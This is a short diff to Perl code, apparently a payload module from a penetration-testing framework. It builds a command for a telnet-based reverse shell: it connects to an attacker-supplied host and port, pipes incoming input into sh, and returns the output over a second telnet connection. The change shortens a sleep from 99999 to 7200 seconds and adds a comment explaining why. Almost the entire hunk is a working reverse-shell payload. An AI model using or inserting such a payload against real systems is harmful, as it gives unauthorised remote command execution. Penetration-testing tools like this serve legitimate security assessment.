@@ -39,8 +39,12 @@ sub CommandString {
   my $host = $self->GetVar('LHOST');
   my $port = $self->GetVar('LPORT');
 
+  # The sleep command keeps telnet from exiting due to an empty read
+  # from stdin. 7200 seconds clears the sleep's from the process table
+  # after a couple of hours. If you need a shell longer than this, then
+  # you are already doing something wrong :-)
   my $command =
-    "sleep 99999|".
+    "sleep 7200|".
     "telnet $host $port|".
     "while : ; do sh && break; done 2>&1|".
     "telnet $host $port";
